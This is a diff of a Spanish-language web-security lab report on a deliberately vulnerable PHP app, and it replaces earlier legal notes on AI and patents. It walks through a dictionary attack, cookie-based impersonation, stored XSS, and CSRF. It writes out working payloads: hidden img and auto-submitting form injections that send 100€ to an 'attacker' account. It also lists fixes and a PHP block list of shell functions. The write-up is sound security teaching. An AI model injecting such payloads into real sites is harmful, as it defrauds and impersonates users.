@@ -51,124 +51,312 @@ qwerty
 dragon
 Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.
 
-Informe de Ataque de Diccionario
+### Ejecución del ataque de diccionario
 
-Explicación del ataque
-El ataque consiste en repetir el proceso de login, una vez por cada usuario de la aplicación, utilizando en cada interacción una contraseña diferente del diccionario. Para obtener los nombres de usuario, se ha aprovechado una vulnerabilidad de inyección SQL en la página insert_player.php para volcar la tabla de usuarios.
+Hemos repetido el proceso de login, una vez por cada usuario de la aplicación, probando en cada intento una contraseña diferente del diccionario. Los nombres de usuario los habíamos obtenido previamente volcando la tabla `users` mediante la inyección SQL en `insert_player.php`.
 
-Campo de usuario con el que el ataque ha tenido éxito
+**Usuario encontrado:** luis
+**Contraseña válida:** 1234
 
-luis
+c)
+Si vais a private/auth.php, veréis que en la función areUserAndPasswordValid, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.
 
-Campo de contraseña con que el ataque ha tenido éxito
+### Corrección en areUserAndPasswordValid
 
-1234  
+El problema es que la función `SQLite3::escapeString()` se está aplicando mal. En el código actual, se aplica a toda la cadena SQL al final, en lugar de aplicarse solo a la variable que introduce el usuario.
 
+**Código vulnerable:**
+```php
+$query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');
+```
 
+Esto hace que el escapado no sirva de nada contra los caracteres especiales que pongamos en `$user`, porque la concatenación ocurre antes.
+
+**Solución aplicable**
+Debemos mover la funcion de escapado para que envuelva solo a la variable `$user`.
+
+Cambiamos la línea por:
+```php
+$query = 'SELECT userId, password FROM users WHERE username = "' . SQLite3::escapeString($user) . '"'; 
+```
+
+d)
+Si habéis tenido éxito con el apartado b), os habéis autenticado utilizando el usuario luis (si no habéis tenido éxito, podéis utilizar la contraseña 1234 para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora Candela Pacheco, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.
+
+Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre eldirectorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo add\_comment.php~. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos .php~ sino que los muestran como archivos de texto sin interpretar.
+
+Esto os permite estudiar el código fuente de add\_comment.php y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?
+
+### La vulnerabilidad de suplantación
+
+La aplicación permite la **suplantación de identidad** porque el ID de usuario (`userId`) lo lee directamente de una cookie (`$_COOKIE['userId']`), y ese dato lo podemos manipular nosotros desde el navegador.
+
+**Código vulnerable:**
+```php
+$query = "INSERT INTO comments (playerId, userId, body) VALUES ('" . $_GET['id'] . "', '" . $_COOKIE['userId'] . "', '$body')";
+```
+
+### Ejecución del ataque
+
+Para explotar este fallo y publicar como otro usuario:
+
+1.  Iniciamos sesión normalmente.
+2.  Interceptamos la petición con las herramientas de desarrollo del navegador o un proxy, y cambiamos el valor de la cookie `userId` por el del usuario que queremos suplantar.
+3.  Al enviar la solicitud, el servidor guarda el comentario usando ese `userId` falso, creyendo que somos esa persona.
+
+---
+### Soluciones de seguridad
+
+Hemos implementado varias medidas para evitar que esto ocurra:
+
+#### 1. Sesiones en el servidor
+Ya no confiamos en la cookie. Ahora el `userId` se obtiene de `$_SESSION['userId']`, que es un dato que el usuario no puede tocar.
+
+**Código seguro:**
+```php
+session_start();
+
+// Si no hay sesión, paramos
+if (!isset($_SESSION['userId'])) {
+    die("Acceso denegado. Debe iniciar sesión.");
+}
+
+$userId = $_SESSION['userId']; // Dato seguro
+
+$query = "INSERT INTO comments (playerId, userId, body) VALUES ('" . $_GET['id'] . "', '" . $userId . "', '$body')";
+```
+
+#### 2. Validación estricta
+Siempre comprobamos que el usuario tiene una sesión válida antes de dejarle hacer nada crítico.
+
+```php
+function isAuthenticated() {
+    return isset($_SESSION['userId']) && !empty($_SESSION['userId']);
+}
+
+if (!isAuthenticated()) {
+    header('Location: login.php');
+    exit;
+}
+```
+
+#### 3. Otras mejoras
+Además, hemos añadido declaraciones preparadas, regeneración de IDs de sesión, cookies con flags `HttpOnly` y `Secure`, y tokens CSRF.
+
+**Ejemplo final:**
+```php
+session_start();
+
+if (!isset($_SESSION['userId'])) {
+    die("Acceso denegado.");
+}
+
+$userId = $_SESSION['userId'];
+$playerId = $_GET['id'];
+$body = $_POST['body'];
+
+// Sentencia preparada para evitar también SQL Injection
+$stmt = $db->prepare("INSERT INTO comments (playerId, userId, body) VALUES (?, ?, ?)");
+$stmt->bind_param("iis", $playerId, $userId, $body);
+$stmt->execute();
+```
+
+Con esto, el `userId` es intocable y la consulta SQL es segura.
 
 ---
 
-## Caso 2: Derechos de Propiedad Industrial (Patentes)
+### Parte 2: XSS
 
-El Caso DABUS: La IA como Inventor Patentable
-Este caso ejemplifica el reto de la Propiedad Industrial, específicamente en el ámbito de las Patentes, donde se exige que el inventor sea un humano para que la invención sea legalmente protegible. La Propiedad Industrial protege invenciones (patentes), marcas, diseños industriales e indicaciones geográficas.
-A. Descripción y Hechos del Caso
-El proyecto DABUS (Device for the Autonomous Bootstrapping of Unified Sentience) es un sistema de IA creado por Stephen Thaler, cuyo objetivo es emular funciones cerebrales con propósitos creativos, generando invenciones de forma autónoma, es decir, sin intervención humana directa.
-El equipo de Thaler presentó solicitudes de patentes en más de 150 países para proteger dos invenciones generadas por DABUS, con la solicitud explícita de nombrar al sistema de IA como el inventor.
-B. Repercusión y Decisión Legal (Patentes)
-La mayoría de las oficinas de propiedad industrial, que se ocupan exclusivamente de la Propiedad Industrial (como la OEPM en España), denegaron las solicitudes de patente bajo la base de la falta de un inventor humano:
-1. Estados Unidos y Unión Europea (Oficina Europea de Patentes, EPO): Tanto la USPTO como la EPO denegaron las solicitudes. Las normativas de patentes exigen que el inventor sea una persona física. En la UE, el inventor debe ser una persona física. El equipo de Thaler incluso intentó declarar que el solicitante (una persona física) tenía derechos por ser el propietario de la máquina, pero esto fue igualmente rechazado.
-2. Sudáfrica: Sudáfrica se convirtió en el único país que concedió una patente a una invención de DABUS. Esto se debió a que su legislación no prevé expresamente que solo las personas físicas puedan ser inventoras, permitiendo que la solicitud avanzara con un análisis de forma, pero no necesariamente de fondo.
-Repercusión en la Propiedad Industrial: Este caso subraya que, aunque la IA pueda generar innovaciones técnicamente "nuevas", el sistema legal de patentes, que protege invenciones consistentes en productos y procedimientos susceptibles de utilización con fines industriales, mantiene una visión antropocéntrica. Las patentes son derechos territoriales y duran típicamente 20 años desde la solicitud, siendo la protección constitutiva (obligatoria). El rechazo de las patentes de DABUS ilustra cómo el sistema busca un equilibrio entre el incentivo a la innovación y el requisito de la autoría humana, enfrentándose al dilema de si invertir millones de euros en IA se justificará si los resultados caen en el dominio público.
+a)
+Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments.php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.
 
+Introducimos el mensaje `<script>alert ('Esto es una prueba de XSS, muy peligroso')</script>` en el formulario de la página `talentscout.local/show_comments.php?id=2`
+
+![img3](img/img3.png)
+
+b)
+¿Por qué dice &amp; cuando miráis un link (como elque aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GETdentro de código html si en realidad el link es sólo con "&" ?
+
+El `&amp;` es la forma correcta de codificar el símbolo `&` dentro de HTML. Esto es necesario porque el `&` es un carácter especial en HTML que indica el inicio de una entidad de carácter.
+
+c)
+Explicad cuál es el problema de show\_comments.php, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.
+
+El problema de `show_comments.php` es una vulnerabilidad de Cross-Site Scripting (XSS) Almacenado. Esto ocurre porque el código de la página muestra directamente los comentarios de la base de datos. Esto permite que un atacante guarde un comentario con código malicioso
+Sustituimos el código de la línea:
+```php
+echo "<div>
+                <h4> ". $row['username'] ."</h4>
+                <p>commented: " . $row['body'] . "</p>
+              </div>";
+```
+Por el siguiente código
+
+```php
+echo "<div>
+                <h4> ". htmlspecialchars($row['username']) ."</h4>
+                <p>commented: " . htmlspecialchars($row['body']) . "</p>
+              </div>";
+```
+
+Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.
+
+**Otras páginas afectadas:** `talentscout.local/insert_player.php`
+
+![img4](img/img4.png)
+
+`talentscout.local/login` (página de inicio de sesión)
+
+![img6](img/img6.png)
+
+Lo descubrimos al poner el script en el campo "User" y una contraseña cualquiera.
+
+**¿Cómo lo hemos descubierto?**
+Lo descubrimos al poner en el apartado "Team Name" al añadir un jugador nuevo.
+
+![img5](img/img5.png)
 
 ---
 
-## Resultado de justicio.es
+### Parte 3 - Control de acceso, autenticación y sesiones de usuarios
+a) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de register.php tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.
 
-### Caso 1
-Prompt: Si uso una obra protegida con una IA generativa, que derechos de creación artísticas infringiría
-
-Resultado:
-
-Al emplear una obra protegida en el desarrollo o entrenamiento de una IA generativa, se pueden vulnerar varios derechos de los autores o titulares de la obra, conforme a la legislación de propiedad intelectual y la normativa europea. A continuación, se detallan los aspectos más relevantes:
-
-Derechos de autor: Según la DIRECTIVA 96/9/CE, las bases de datos que constituyan una creación intelectual de su autor están protegidas por derechos de autor. Esto implica que el uso de obras protegidas para entrenar una IA generativa podría considerarse una infracción si no se cuenta con la autorización del titular de los derechos [1].
-
-Derechos afines: La DIRECTIVA 93/83/CEE establece que la protección de los derechos afines de autor no afecta a los derechos de autor, lo que significa que, además de los derechos de autor, también se deben considerar los derechos relacionados que puedan existir sobre la obra utilizada [2].
-
-Medidas tecnológicas: La DIRECTIVA 2001/29/CE menciona que las medidas tecnológicas adoptadas por los titulares de derechos disfrutarán de protección jurídica. Si la IA generativa elude estas medidas sin autorización, podría estar cometiendo una infracción [3].
-
-Información para la gestión de derechos: La misma DIRECTIVA 2001/29/CE establece que se debe proteger la información para la gestión de derechos. Esto incluye cualquier acto de supresión o alteración de esta información, lo que podría ser relevante si la IA utiliza obras sin respetar esta información [3].
-
-Excepciones y limitaciones: Aunque existen ciertas excepciones y limitaciones al derecho de reproducción, como se establece en el artículo 5 de la DIRECTIVA 2001/29/CE, estas son específicas y no deben afectar la explotación normal de la obra. Por lo tanto, si el uso de la obra por parte de la IA no se ajusta a estas excepciones, se consideraría una violación de los derechos de autor [3].
-
-Acuerdo de Asociación: En el contexto de un acuerdo de asociación, se establece la obligación de proteger adecuadamente los derechos de autor y afines, lo que implica que cualquier uso no autorizado de obras protegidas podría ser considerado una infracción [4].
-
-Ejemplo práctico:
-Si una empresa desarrolla una IA generativa que utiliza obras literarias protegidas sin el consentimiento de los autores, podría estar violando los derechos de autor conforme a la normativa europea. Esto incluye no solo la reproducción de fragmentos de texto, sino también la creación de nuevas obras derivadas basadas en el contenido original, lo que podría llevar a reclamaciones legales por parte de los titulares de derechos.
-
- Jurisprudencia Menor 
-La jurisprudencia relevante en relación con el uso de obras protegidas en el desarrollo o entrenamiento de una IA generativa se encuentra principalmente en la Sentencia del Tribunal de Justicia de la Unión Europea (TJUE) en el asunto CV-ONLINE LATVIA SIA C-762/19. Esta sentencia establece que el derecho sui generis de los fabricantes de bases de datos, conforme al artículo 7 de la Directiva 96/9/CE, permite a estos prohibir la extracción y/o reutilización de la totalidad o de una parte sustancial del contenido de la base de datos, siempre que dicha extracción represente una inversión sustancial desde el punto de vista cuantitativo o cualitativo. Esta protección tiene como objetivo garantizar que quienes asumen el riesgo de inversión en la creación de bases de datos puedan amortizar dicha inversión, evitando la apropiación no autorizada de los resultados obtenidos [5] [2002] [2003]. Además, se destaca que los actos que excedan los derechos legítimos del usuario y que perjudiquen la inversión del fabricante pueden dar lugar a acciones legales, lo que implica que el uso de obras protegidas en IA generativa sin autorización podría vulnerar estos derechos [2006]. Por tanto, el desarrollo de IA generativa que utilice obras protegidas debe considerar la normativa de propiedad intelectual y la posible infracción de los derechos de los autores o titulares de las obras, así como la normativa europea que protege las bases de datos y su contenido.
-
- Conclusión 
-El uso de obras protegidas para entrenar una IA generativa sin autorización puede infringir los derechos de autor y otros derechos de propiedad intelectual. Esto incluye tanto la reproducción de la obra como la creación de obras derivadas no autorizadas.
+Hemos modificado `register.php` y `auth.php` para mejorar la seguridad. En `register.php`, las contraseñas ahora se encriptan con `password_hash()` antes de almacenarse, protegiéndolas de brechas de datos. Ambas páginas utilizan sentencias preparadas para prevenir inyecciones SQL, separando el comando de la información del usuario. Finalmente, `auth.php` verifica las contraseñas con `password_verify()`, asegurando una autenticación segura sin exponer las claves. Estos cambios abordan vulnerabilidades críticas en el registro y autenticación.
 
 
-Los elementos clave son: la necesidad de obtener autorización de los titulares de derechos para usar sus obras en el entrenamiento de la IA y el respeto a las medidas tecnológicas de protección y la información de gestión de derechos. La jurisprudencia del TJUE también protege a los fabricantes de bases de datos, impidiendo la extracción no autorizada de su contenido.
+b) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta private
+
+**Protección contra fuerza bruta:**
+Hemos añadido un bloqueo de 15 minutos si el usuario falla 5 veces seguidas al intentar entrar. Así evitamos que alguien pruebe cientos de contraseñas automáticamente. Para esto hemos modificado la base de datos añadiendo `failed_login_attempts` y `last_failed_login`.
+
+**Gestión segura de sesiones:**
+Hemos dejado de usar cookies manuales y hemos pasado al sistema `session_start()` de PHP. Es mucho más seguro porque PHP maneja los identificadores por nosotros.
+
+**Regeneración de ID:**
+Cada vez que alguien se loguea, usamos `session_regenerate_id(true)`. Esto invalida el identificador antiguo y asigna uno nuevo, impidiendo ataques de fijación de sesión.
+
+**Cookies blindadas:**
+Hemos configurado las cookies con `HttpOnly` (para que JavaScript no pueda leerlas y robarlas) y `SameSite=Strict` (para mitigar ataques CSRF).
+
+**Sentencias preparadas en comentarios:**
+También hemos actualizado `add_comment.php` para usar sentencias preparadas, igual que hicimos en el login, para cerrar la puerta a inyecciones SQL en toda la web.
+
+c) Volvemos a la página de register.php, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.
+
+Las medidas para gestionar el acceso al registro se centran en el Control de Acceso Basado en Roles (RBAC). 
+Esto implica: 
+1) Definir roles ('admin', 'user'). 
+2) Asignar roles a los usuarios. 
+3) Verificar el rol del usuario antes de permitir el acceso a register.php.
+  Medidas factibles implementadas:
+   1. Modificación de la Base de Datos: Se añadió la columna role a la tabla users para almacenar el nivel de acceso de cada usuario.
+   2. Asignación de Rol de Administrador: Se actualizó al usuario 'luis' para que tenga el rol de 'admin', permitiéndole gestionar el registro.
+   3. Funciones de Verificación de Rol: Se crearon funciones en auth.php (get_logged_in_user, is_admin) para determinar dinámicamente si el usuario actual tiene permisos administrativos.
+   4. Protección de `register.php`: Se añadió una restricción al inicio de register.php que bloquea el acceso y detiene la ejecución si el usuario no es un administrador autenticado.
+
+d) Al comienzo de la práctica hemos supuesto que la carpeta private no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?
+
+La suposición de que la carpeta private no es accesible es incorrecta en una configuración local predeterminada. Un servidor web mal configurado podría servir archivos sensibles como database.db o auth.php si un usuario solicita su URL directa
+
+  Medidas para prevenir el acceso:
+   1. Configuración del Servidor Web (.htaccess / Apache): La medida más efectiva y factible es usar un archivo .htaccess dentro de la carpeta private con la directiva Deny from all. Esto instruye a Apache a rechazar cualquier solicitud HTTP directa a archivos en ese directorio, manteniéndolos accesibles solo para los scripts PHP del servidor.
+   2. Mover fuera del Document Root: Lo ideal es mover la carpeta private fuera del directorio público (web/ o public_html/). Así, es físicamente imposible acceder a ella vía URL, pero los scripts PHP puede seguir incluyéndola mediante rutas relativas o absolutas.
+
+e) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.
+
+  **Medidas implementadas:**
+
+   1. **Vinculación del navegador (User-Agent):**
+       Ahora, al iniciar sesión, guardamos el `User-Agent` del usuario en `$_SESSION['user_agent']`.
+
+   2. **Verificación constante:**
+       En cada petición que hace el usuario, comprobamos si su `User-Agent` coincide con el que guardamos al principio. Si cambia de repente (lo que podría indicar un robo de sesión desde otro dispositivo), cerramos la sesión inmediatamente:
+
+       ```php
+       if (!isset($_SESSION['user_agent']) || $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
+            session_unset();
+            session_destroy();
+         return null;
+       }
+       ```
+---
+
+### Parte 4 - Servidores web
+¿Qué medidas de seguridad se implementariaís en el servidor web para reducir el riesgo a ataques?
+
+ 1. Deshabilitar la Fuga de Información (Information Leakage)
+  Por defecto, los servidores "hablan" demasiado. Dicen qué versión exacta de Apache, PHP y sistema operativo usan, lo cual ayuda a un atacante a buscar exploits específicos.
+
+   Ocultar la versión de Apache:
+      En el archivo de configuración de Apache (apache2.conf o httpd.conf):
+   1     ServerTokens Prod  # Solo dice "Apache", sin versión ni OS
+   2     ServerSignature Off # Elimina la firma al pie de las páginas de error
+   Ocultar la versión de PHP:
+      En el archivo php.ini:
+      expose_php = Off
+   Desactivar el listado de directorios:
+      Si no hay un index.php en una carpeta, Apache suele listar todos los archivos (como vimos en la carpeta /private antes de poner el .htaccess).
+        Options -Indexes
+
+ 2. Implementar Cabeceras de Seguridad HTTP (Security Headers)
+  Estas cabeceras le dicen al navegador del usuario cómo comportarse para prevenir ataques como XSS o Clickjacking.
+
+   Content-Security-Policy (CSP): La más importante. Define de dónde se pueden cargar scripts, estilos e imágenes. Ayuda enormemente a mitigar XSS.
+   X-Frame-Options: Evita que tu web sea incrustada en un <iframe> de otro sitio, previniendo el Clickjacking.
+       Header always set X-Frame-Options "SAMEORIGIN"
+   X-Content-Type-Options: Evita que el navegador "adivine" el tipo de archivo (MIME-Sniffing).
+       Header always set X-Content-Type-Options "nosniff"
+   Strict-Transport-Security (HSTS): Fuerza al navegador a usar siempre HTTPS, impidiendo ataques de "Downgrade" a HTTP.
+
+  3. Habilitar HTTPS (SSL/TLS)
+  Aunque es obvio, es fundamental.
+   Todo el tráfico debe ir cifrado para evitar que alguien en la red intercepte las credenciales o las cookies de sesión (lo que permitiría el robo de sesión que acabamos de mitigar parcialmente con el
+     User-Agent).
+   Se debe configurar una redirección forzosa de HTTP a HTTPS.
+
+  4. Web Application Firewall (WAF)
+  Instalar y configurar un WAF como ModSecurity.
+   Un WAF analiza el tráfico HTTP entrante y bloquea patrones maliciosos conocidos antes de que lleguen a tu código PHP.
+   Hubiera bloqueado automáticamente los intentos de inyección SQL (' OR '1'='1) y XSS (<script>...) que probamos anteriormente, actuando como una red de seguridad extra.
+
+  5. Restricción de Métodos HTTP
+  Si tu aplicación solo usa GET y POST, deshabilita el resto.
+   <LimitExcept GET POST HEAD>
+       deny from all
+   </LimitExcept>
+  Esto previene el uso de métodos como TRACE (usado en ataques XST) o PUT si no son necesarios.
+
+  6. Deshabilitar funciones peligrosas de PHP
+  En el php.ini, deshabilitar funciones que los atacantes usan para ejecutar comandos en el sistema si logran subir una web shell:
+
+   disable_functions = exec, passthru, shell_exec, system, proc_open, popen, curl_exec, parse_ini_file, show_source
+
+---
+### Parte 5 - CSRF
+Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguiente enlace: http://web.pagos/donate.php?amount=100&receiver=attacker, mediante el cual, cualquiera que haga click hará una donación de 100€ al nuestro usuario (con nombre 'attacker') de la famosa plataforma de pagos online 'web.pagos' (Nota: como en realidad esta es una dirección inventada, vuestro navegador os devolverá un error 404).
+
+a) Editad un jugador para conseguir que, en el listado de jugadores list\_players.php aparezca, debajo del nombre de su equipo y antes de show/add comments un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.
+
+En el campo
+Team (Equipo) del formulario de edición de jugador (insert_player.php).
+
+Introduzco
+   1 OWASP <br><form action="http://web.pagos/donate.php" method="GET"><input type="hidden" name="amount" value="100"><input type="hidden" name="receiver" value="attacker"><input type="submit"
+     value="Profile"></form>
+
+b) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show\_comments.php).
+ Excelente jugador. <img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;">
 
 
-En la práctica, esto significa que las empresas que desarrollan IA generativas deben asegurarse de obtener las licencias necesarias para utilizar obras protegidas, respetar las excepciones y limitaciones al derecho de reproducción, y evitar eludir las medidas tecnológicas de protección. No hacerlo puede acarrear reclamaciones legales por parte de los titulares de los derechos.
+c) Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.
+Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).
 
-### Caso 2
+Para que el ataque funcione, el usuario que ve el mensaje tiene que tener **una sesión activa en `web.pagos`** en ese mismo momento.
 
-Prompt: Como sería el tema legal con IA generativa en el tema de Derechos de Propiedad Industrial
-
-Respuesta:
-
-La legislación europea y española aborda el uso de la inteligencia artificial generativa en el ámbito de los derechos de propiedad industrial a través de varias directivas y reglamentos que regulan patentes, marcas y diseños industriales.
-
-Patentes: La protección de las invenciones, incluidas aquellas generadas por inteligencia artificial, se encuentra regulada en la legislación de patentes de la Unión Europea. Las patentes protegen las invenciones que son nuevas, implican una actividad inventiva y son susceptibles de aplicación industrial. Sin embargo, la legislación no especifica de manera directa cómo se aplican estas normas a las invenciones generadas por inteligencia artificial. Esto puede generar incertidumbre respecto a si una invención creada por un sistema de IA puede ser patentada y quién sería el titular de la patente: el creador del algoritmo, el usuario de la IA o la propia IA.
-
-Marcas: Las marcas están protegidas bajo la legislación de propiedad industrial, que incluye la Directiva 2015/2436 de la UE. Esta legislación establece que las marcas deben ser distintivas y no pueden ser confundidas con otras marcas registradas. En el contexto de la inteligencia artificial, se plantea la cuestión de si una marca generada o sugerida por un sistema de IA puede ser registrada y si cumple con los requisitos de distintividad y no confusión.
-
-Diseños industriales: La protección de los diseños industriales se regula a través del Reglamento (CE) No 6/2002 del Consejo de la UE. Este reglamento protege los diseños que son nuevos y tienen carácter singular. En el caso de los diseños generados por inteligencia artificial, la cuestión de la titularidad y la originalidad se vuelve relevante, ya que la legislación actual no aborda explícitamente cómo se aplican estas normas a los diseños creados por sistemas automatizados.
-
-Protección contra la competencia desleal: La legislación también incluye la protección contra la competencia desleal, que se define en el artículo 10 bis del Convenio de París para la Protección de la Propiedad Industrial. Esta protección puede ser relevante en el contexto de la inteligencia artificial generativa, especialmente si se considera que la IA puede crear productos que imiten o se asemejen a los de otros, lo que podría dar lugar a conflictos de interés y disputas legales.
-
-Derechos de autor: Aunque no se menciona específicamente la inteligencia artificial generativa, la Directiva 96/9/CE del Parlamento Europeo y del Consejo establece que las bases de datos que constituyan una creación intelectual están protegidas por derechos de autor, lo que podría extenderse a las obras generadas por IA en función de su originalidad y creatividad. La protección del derecho de autor no se extiende al contenido de las bases de datos, lo que significa que el contenido generado por IA podría no estar protegido si no cumple con los criterios de originalidad [1].
-
-Acuerdos internacionales: En el ámbito de los acuerdos internacionales, como el Acuerdo de Asociación y el Acuerdo Euromediterráneo, se menciona que la propiedad intelectual incluye derechos de autor, patentes, diseños industriales y protección contra la competencia desleal, lo que refuerza la importancia de la propiedad intelectual en el contexto de la innovación y la tecnología [2][3].
-
-Ejemplo práctico: Si una empresa utiliza un sistema de inteligencia artificial para diseñar un nuevo producto, la empresa debe considerar si el diseño puede ser patentado, si puede registrar una marca asociada y si el diseño cumple con los requisitos de originalidad para la protección de derechos de autor. Además, debe asegurarse de que el uso de la IA no infrinja los derechos de propiedad industrial de terceros, lo que podría dar lugar a litigios por competencia desleal.
-
-En resumen, la regulación del uso de la inteligencia artificial generativa en el ámbito de los derechos de propiedad industrial es compleja y presenta desafíos en cuanto a la titularidad, la originalidad y la protección efectiva de las innovaciones generadas por estas tecnologías.
-
-🇪🇸  Legislación Estatal 
-La legislación española y europea aborda el uso de la inteligencia artificial generativa en el ámbito de los Derechos de Propiedad industrial, incluyendo patentes, marcas y diseños industriales, a través de diversas normativas que regulan estos derechos. A continuación, se analizan las principales leyes relevantes en este contexto:
-
-1. Ley 24/2015, de 24 de julio, de Patentes
-La Ley de Patentes establece que el derecho a la patente pertenece al inventor o a sus causahabientes, y es transmisible por todos los medios que el derecho reconoce [5]. Esto implica que las invenciones generadas por inteligencia artificial pueden ser patentadas si cumplen con los requisitos de novedad y actividad inventiva. La ley también menciona que si varias personas realizan la misma invención de forma independiente, el derecho a la patente pertenecerá a aquella cuya solicitud tenga una fecha anterior [5]. Esto es crucial en el contexto de la inteligencia artificial, donde múltiples desarrolladores pueden generar soluciones similares simultáneamente.
-
-2. Ley 20/2003, de 7 de julio, de Protección Jurídica del Diseño Industrial
-Esta ley regula la protección de los diseños industriales, estableciendo que el diseño debe ser nuevo y singular para ser registrado [6]. La ley permite la protección de diseños generados por inteligencia artificial siempre que cumplan con estos criterios. Además, se contempla la posibilidad de que un diseño no registrado goce de protección comunitaria específica frente a actos de explotación no autorizada durante un período determinado [6].
-
-3. Reglamento (CE) n.º 6/2002 sobre los dibujos y modelos comunitarios
-Este reglamento establece un marco para la protección de los diseños en toda la Unión Europea, permitiendo que los diseños generados por inteligencia artificial puedan ser protegidos a nivel comunitario si cumplen con los requisitos establecidos [6]. La legislación europea busca armonizar la protección de los diseños y facilitar su inscripción en todos los Estados miembros.
-
-4. Organización Europea de Patentes
-El Convenio sobre la Patente Europea establece que la patente europea confiere a su titular los mismos derechos que una patente nacional en los Estados contratantes [7]. Esto significa que, si una invención generada por inteligencia artificial es patentada en un país, puede ser válida en otros países europeos, facilitando su protección en un mercado más amplio.
-
-5. Relación con los derechos de autor
-El Acuerdo Comercial entre la Unión Europea y sus Estados Miembros y otros acuerdos internacionales también tocan la relación entre los derechos de diseño y los derechos de autor, permitiendo que un diseño pueda ser protegido bajo ambas legislaciones si cumple con las condiciones pertinentes [7]. Esto es relevante para las creaciones generadas por inteligencia artificial que pueden tener elementos que se superponen entre el diseño industrial y la propiedad intelectual.
-
-Conclusiones sobre la Inteligencia Artificial Generativa
-La legislación actual proporciona un marco para la protección de invenciones y diseños generados por inteligencia artificial, siempre que cumplan con los requisitos de novedad y singularidad. Sin embargo, el tratamiento específico de los derechos de propiedad industrial en relación con la inteligencia artificial todavía está evolucionando, y es posible que se requieran futuras modificaciones legislativas para abordar de manera más directa los desafíos y oportunidades que presenta esta tecnología emergente.
-
- Jurisprudencia Menor 
-La regulación de la inteligencia artificial generativa en el ámbito de los Derechos de Propiedad Industrial, como patentes, marcas y diseños industriales, se ve influenciada por la jurisprudencia del Tribunal de Justicia de la Unión Europea (TJUE). En particular, la Sentencia CV-ONLINE LATVIA SIA C-762/19 establece que la protección de bases de datos bajo el derecho sui generis, según la Directiva 96/9, asegura que la inversión sustancial en la creación y mantenimiento de bases de datos no sea objeto de extracción o reutilización no autorizada, lo que es relevante en contextos donde la inteligencia artificial maneja grandes volúmenes de datos [8] [2002] [2003]. Esta protección es crucial para fomentar la innovación y el desarrollo en el sector de la información, permitiendo que los fabricantes de bases de datos controlen el uso de su contenido y protejan su inversión. Además, la Directiva 2004/48 establece medidas para garantizar el respeto de los derechos de propiedad intelectual, incluyendo los de propiedad industrial, lo que implica que cualquier innovación basada en inteligencia artificial debe considerar estos derechos y las medidas para su protección [9] [2007]. La jurisprudencia del TJUE tiene carácter vinculante, lo que significa que los Estados miembros deben adaptar su legislación nacional para cumplir con estos principios, asegurando así un nivel homogéneo de protección en el mercado interior europeo. Por lo tanto, cualquier desarrollo en el uso de inteligencia artificial generativa debe alinearse con estas normativas y jurisprudencias para evitar infracciones y promover un entorno competitivo justo.
-
- Conclusión 
-La legislación española y europea actual permite proteger las creaciones generadas por inteligencia artificial dentro del ámbito de la Propiedad Industrial, siempre y cuando cumplan con los requisitos de novedad y singularidad.
+Si es así, cuando el navegador intente cargar la imagen falsa (que en realidad es el enlace de donación), enviará automáticamente las cookies de sesión de `web.pagos`. El servidor de pagos recibirá la petición, verá que las cookies son válidas y procesará la transacción creyendo que el usuario la ha hecho voluntariamente.
 
 
+d) Si web.pagos modifica la página donate.phpdpara que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.
+
+Buena jugada.<form id="f" method="POST" action="http://web.pagos/donate.php" style="display:none"><input type="hidden" name="amount" value="100"><input type="hidden" name="receiver"
+     value="attacker"></form><script>document.getElementById('f').submit()</script>
